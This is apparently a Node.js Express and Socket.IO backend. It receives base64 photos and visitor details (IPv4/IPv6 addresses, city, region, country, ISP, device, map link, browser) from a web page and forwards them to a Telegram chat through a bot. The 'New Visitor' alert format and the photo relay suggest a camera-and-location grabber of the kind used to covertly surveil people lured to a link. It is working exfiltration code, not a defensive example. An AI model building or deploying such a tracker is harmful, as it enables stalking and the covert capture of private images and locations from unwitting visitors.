require("dotenv").config();

const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const axios = require("axios");
const fs = require("fs");
const FormData = require("form-data");
const cors = require("cors");
const { v4: uuidv4 } = require("uuid");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

app.use(cors());
app.use(express.json({ limit: "10mb" }));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Basic server test
app.get("/", (req, res) => {
  res.send("Server running 🚀");
});

// Handle photo upload
app.post("/upload", async (req, res) => {
  try {
    const { image, userId } = req.body;
    if (!image || !userId) return res.status(400).send("Missing image or userId");

    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const fileName = `photo_${userId}_${Date.now()}.png`; // unique per user

    fs.writeFileSync(fileName, base64Data, "base64");

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", fs.createReadStream(fileName));

    await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      formData,
      { headers: formData.getHeaders() }
    );

    res.json({ message: "Sent to Telegram ✅" });

  } catch (err) {
    console.error(err);
    res.status(500).send("Error");
  }
});

// Socket.IO: handle real-time visitor info
io.on("connection", (socket) => {
  console.log("User connected:", socket.id);

  // Generate a unique userId for this connection
  const userId = uuidv4();
  socket.emit("assign-userId", { userId });

  // Receive visitor info from frontend
  socket.on("visitor-info", (data) => {
    console.log("Visitor Data:", data);

    const message = `⚠️ New Visitor

🌐 IPv6: ${data.ipv6 || "N/A"}
🌐 IPv4: ${data.ipv4 || "N/A"}

📍 Location: ${data.city || "N/A"}, ${data.region || "N/A"}, ${data.country || "N/A"}

🏢 ISP: ${data.isp || "N/A"}

📱 Device: ${data.device || "N/A"}

🌍 Map: ${data.map || "N/A"}

🌐 Browser: ${data.browser || "N/A"}
🆔 UserID: ${userId}
`;

    // Send visitor info to Telegram
    sendTelegram(message);
  });

  socket.on("disconnect", () => {
    console.log("User disconnected:", socket.id);
  });
});

// Helper: send message to Telegram
async function sendTelegram(text) {
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text
    });
  } catch (err) {
    console.error("Telegram send error:", err.message);
  }
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT} 🚀`));